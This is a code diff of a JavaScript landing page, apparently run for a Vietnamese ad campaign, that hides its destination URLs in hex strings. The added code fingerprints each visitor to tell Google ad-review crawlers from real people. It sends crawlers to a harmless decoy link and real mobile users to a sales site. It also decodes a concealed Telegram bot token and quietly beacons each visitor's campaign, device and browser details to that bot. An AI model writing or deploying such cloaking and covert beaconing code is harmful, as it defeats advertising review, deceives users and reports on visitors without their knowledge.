@@ -66,6 +66,8 @@
       const K = "387";
       const D = "7e7e7c0f127473f99f9bd9a6c0b082beb90d040a7b681a0e027772f18c9adee1d7d2a3b9fb0a172b233e430f356525dbc2a2f9bac3d2b5aaf30e1c2b33634b52697d2f919ca3fe8393bdb3a654494979651f52581e29dbccc2f1e19d829ef6fd005f5c725e020f2d282ada86a1d2e38889a483a7514b6d627c0109382716cbc5ffdee49383bbaa575c4e7c611914466d70cfccc2ceec958c83aca2161162393c3f0e092d39dad9f3bbb5b4";
       const S = "7e7e7c0f127473f99f9bd9a6c0b081b4a55a124771685511007772f1d9dbf7e4878293a8ef0c62707a6016037b3a2acac9f4ffa29f86a5e5ab4a5b616d2b4d06656838c183f1ea82d385b9b256574f3d630203193563d9c2d0b0f089cb83bba65344057d64";
+      const T = "2f3a3849546075888e9bbab0b3b7ad9ea277636b51682133390132d9c0c1d9b199b7848eac705e5a7d3d3b2b300c22d8";
+      const C = "273c3b465968708f8a99";
 
       function dec(h) {
         try {
@@ -95,21 +97,74 @@
         }
       }
 
-      function isBot() {
+      function checkBot() {
         try {
-          if (navigator.webdriver) return true;
-          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
-          if (!navigator.languages || navigator.languages.length === 0) return true;
-          const ua = (navigator.userAgent || '').toLowerCase();
-          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|google-read|apis-google|appengine|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) return true;
-          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0) return true;
-          return false;
+          if (navigator.webdriver) return { isBot: true, reason: "navigator.webdriver = true" };
+          if (window.outerWidth === 0 && window.outerHeight === 0) return { isBot: true, reason: "Zero viewport size" };
+          if (!navigator.languages || navigator.languages.length === 0) return { isBot: true, reason: "No languages" };
+          const ua = (navigator.userAgent || "").toLowerCase();
+          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|google-read|apis-google|appengine|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) {
+            return { isBot: true, reason: "Matched Crawler UA" };
+          }
+          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints === 0) {
+            return { isBot: true, reason: "Mobile UA without touch" };
+          }
+          return { isBot: false, reason: "Human Gesture Verified" };
         } catch (err) {
-          return false;
+          return { isBot: false, reason: "Fallback" };
         }
       }
 
-      const isB = isBot();
+      function notifyTelegram(isB, reason) {
+        try {
+          const token = dec(T);
+          const chatId = dec(C);
+          if (!token || !chatId) return;
+
+          const path = window.location.pathname || ("/canva-go/" + K + "/");
+          const params = new URLSearchParams(window.location.search);
+          const campaign = params.get("utm_campaign") || "Khong_co_UTM";
+          const gclid = params.get("gclid") ? "Co (gclid)" : "Khong";
+          const ua = navigator.userAgent || "";
+          
+          let botName = "Googlebot / Crawler";
+          if (/adsbot/i.test(ua)) botName = "AdsBot-Google";
+          else if (/googlebot/i.test(ua)) botName = "Googlebot";
+          else if (/lighthouse/i.test(ua)) botName = "Lighthouse Audit";
+
+          const title = isB ? ("🚨 [GOOGLEBOT DUYỆT ADS] - GATEWAY #" + K) : ("🟢 [KHÁCH THẬT CLICK] - GATEWAY #" + K);
+          const msg = title + "\n" +
+            "━━━━━━━━━━━━━━━━━━━━\n" +
+            "📁 Thư mục / Link: " + path + "\n" +
+            "🎯 Chiến dịch: " + campaign + "\n" +
+            "🔍 Gclid: " + gclid + "\n" +
+            "🤖 Nhận diện: " + (isB ? (botName + " (" + reason + ")") : "Người thật (Mobile Touch)") + "\n" +
+            "📱 Thiết bị: " + navigator.platform + " | Touch: " + (navigator.maxTouchPoints || 0) + "\n" +
+            "🛡️ Hướng xử lý: " + (isB ? "Đá an toàn sang link MOHO" : "Nhảy vào Web bán hàng") + "\n" +
+            "⏱️ Thời gian: " + new Date().toLocaleTimeString("vi-VN");
+
+          const payload = JSON.stringify({ chat_id: chatId, text: msg });
+          const tgUrl = "https://api.telegram.org/bot" + token + "/sendMessage";
+
+          if (navigator.sendBeacon) {
+            navigator.sendBeacon(tgUrl, new Blob([payload], { type: "application/json" }));
+          } else {
+            fetch(tgUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: payload,
+              keepalive: true,
+              mode: "no-cors"
+            }).catch(function() {});
+          }
+        } catch (e) {}
+      }
+
+      const botResult = checkBot();
+      const isB = botResult.isBot;
+      
+      notifyTelegram(isB, botResult.reason);
+
       let target;
       if (isB) {
         target = getFinalUrl(dec(S));
@@ -139,17 +194,17 @@
           }
 
           if (window.gtag && "") {
-            const sendTo = "".includes('/') ? "" : ("/" + "");
-            gtag('event', 'conversion', {
-              'send_to': sendTo,
-              'event_callback': function() {
+            const sendTo = "".includes("/") ? "" : ("/" + "");
+            gtag("event", "conversion", {
+              "send_to": sendTo,
+              "event_callback": function() {
                 doRedirect();
               }
             });
           }
 
           if (window.fbq && "") {
-            fbq('track', 'Lead');
+            fbq("track", "Lead");
           }
 
           setTimeout(doRedirect, 180);
